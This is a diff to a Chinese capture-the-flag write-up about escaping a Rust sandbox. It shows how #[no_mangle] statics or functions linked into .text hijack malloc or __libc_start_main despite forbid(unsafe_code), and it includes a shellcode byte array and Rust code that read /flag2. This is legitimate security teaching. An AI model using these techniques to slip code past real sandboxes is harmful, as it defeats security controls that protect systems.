@@ -508,18 +508,24 @@ pub fn run() { }
 
 #### 方法3: 劫持 `.got` 表项 (不清楚这么表述是否准确)
 
-这个更好理解一些, 相当于直接把函数体给换掉了, 让它不认 libc 里的 `malloc` 了, 直接一波认贼作父, 把你写的 `malloc` 当成它应该调用的 `malloc`. 注意虽然跟上一个方法只有 `.got` 变成了 `.text`, 但这里的 `[u8; 6]` 实际上是代码, 而不是地址! 这个方法同样可以解第二问. 
+这个更好理解一些, 相当于直接把函数体给换掉了, 让它不认 libc 里的 `malloc` 了, 直接一波认贼作父, 把你写的 `malloc` 当成它应该调用的 `malloc`. 注意虽然跟上一个方法只有 `.got` 变成了 `.text`, 但这里的 `[u8; 6]` 实际上是代码, 而不是地址! 这样编译出来的代码中的 `.got` 表中就没有 `malloc` 的地址了, 相当于把它给"劫持"了. 当然这个方法同样可以解第二问. 
 
 ```rust
 #![forbid(unsafe_code)]
 
 #[no_mangle]
-#[link_section = ".text"]
+#[link_section = ".text"] // this is not necessary
 pub static malloc: [u8; 6] = [ 1, 1, 4, 5, 1, 4 ]; 
 pub fn run() { }
 
 //EOF
 ```
+
+以下两张图分别是劫持 `malloc` 和不劫持 `malloc` 编译出来的 ELF:
+
+![](assets/rust-1.png)
+
+![](assets/rust-2.png)
 
 ## Flag 2: 读取打开的 /flag2 文件
 
@@ -533,6 +539,25 @@ pub fn run() { }
 pub static malloc: [u8; 53] = [
     0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50, 0x48, 0xb8, 0x2e, 0x67, 0x6d, 0x60, 0x66, 0x33, 0x1, 0x1, 0x48, 0x31, 0x4, 0x24, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0xf, 0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5,
 ];
+
+pub fn run() { }
+
+//EOF
+```
+
+不过既然都能用 shellcode 了, 那我用点 safe rust 的代码不更没啥问题了吗? 反正 seccomp 也不起作用了. 而且你甚至还可以让你的程序正常退出:
+
+```rust
+#![forbid(unsafe_code)]
+
+use std::{fs::read_to_string, process::exit};
+
+#[no_mangle]
+#[link_section = ".text"]
+fn __libc_start_main() { // `__libc_start_main` is also in `.got`
+    println!("{}", read_to_string("/flag2").unwrap());
+    exit(0);
+}
 
 pub fn run() { }
 
